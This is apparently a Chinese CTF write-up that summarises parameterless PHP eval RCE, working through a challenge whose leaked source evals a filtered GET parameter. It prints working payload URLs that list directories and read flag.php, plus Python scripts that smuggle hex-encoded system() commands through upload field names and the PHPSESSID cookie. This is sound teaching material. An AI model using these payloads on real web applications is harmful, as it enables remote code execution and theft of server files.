这题提到了无参RCE，做个总结。

git泄露源码，利用githack扫出源码:

>><?php
>>include "flag.php";
>>echo "flag在哪里呢？<br>";
>>if(isset($_GET['exp'])){
   if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
       if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
           if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
               // echo $_GET['exp'];
               @eval($_GET['exp']);
           }
           else{
               die("还差一点哦！");
           }
       }
       else{
           die("再好好想想！");
       }
   }
   else{
       die("还想读flag，臭弟弟！");
   }
>>}
>>// highlight_file(__FILE__);
>>?>

🍭分析

  • 需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。
  • 过滤了常用的几个伪协议，不能以伪协议读取文件。
  • (?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。
  • 正则匹配掉了et/na/info等关键字。
  • eval($_GET['exp']); 无参数RCE

flag在flag.php,要读取它首先需要得到当前目录下的文件
scandir()函数可以扫描当前目录下的文件：

<?php
print_r(scandir('.'));
?>

我们需要构造scandir('.').

这里需要用到

localeconv() 函数

返回一包含本地数字及货币格式信息的数组.

数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。
pos() 是current() 的别名

第一个if就解决了

print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));

测试一下：

接下来要思考怎么读取倒数第二个数组

🍭current

不能直接读取flag的元素，只能运用其它元素。

🍭array_reverse()

以相反的元素顺序返回数组

?exp=print_r(array_reverse(scandir(current(localeconv()))));

🍭array_flip()

交换数组的键和值

?exp=print_r(array_flip(scandir(current(localeconv()))));

array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php

?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));

🍭session_id(session_start())

本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。
使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。
session_id()可以获取到当前的session id。故手动设置名为PHPSESSID的cookie，并设置值为flag.php

🍭tips：

如何读flag.php的源码

因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()

view-source:http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));
?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
?exp=show_source(session_id(session_start()));

得到flag

🍭无参RCE

比较常见getshell是eval($_GET['code']);
但它一般有如下限制

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
 eval($_GET['code']);
}

此时我们使用参数则无法通过正则的校验，该正则是我们说的无参数函数的校验，其只允许执行如下格式函数

a(b(c()));
a();

但不允许

a('123');

🍭get_defined_vars()

使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效。我们可以使用get_defined_vars()，首先看一下它的回显

可回显全局变量：$_GET$_POST$_FILES$_COOKIE，故可利用GET进行RCE

但一般网站喜欢对$_GET$_POST$_COOKIE进行过滤，我们可以尝试从$_FILES下手，这就需要我们自己写一个上传：

import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('sky cool!')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content

若不用hex编码进行RCE，空格会被替换成_

🍭session_id()

PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即hex2bin
脚本如下

import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
	'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content

即可达成RCE和bypass的目的

🍭dirname() & chdir()

目录遍历读文件，我们可以利用getcwd()获取当前目录

?code=var_dump(getcwd());

string(13) "/var/www/html"

用scandir()进行当前目录遍历

?code=var_dump(scandir(getcwd()));

array(3) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" }

用dirname()进行目录上跳

?code=var_dump(scandir(dirname(getcwd())));

array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(14) "flag_phpbyp4ss" [3]=> string(4) "html" }

更改当前目录

chdir ( string $directory ) : bool

将 PHP 的当前目录改为 directory。
所以我们这里在

dirname(getcwd())

进行设置即可

chdir(dirname(getcwd()))

读取/var/www/123:

http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));

即可进行文件读取。
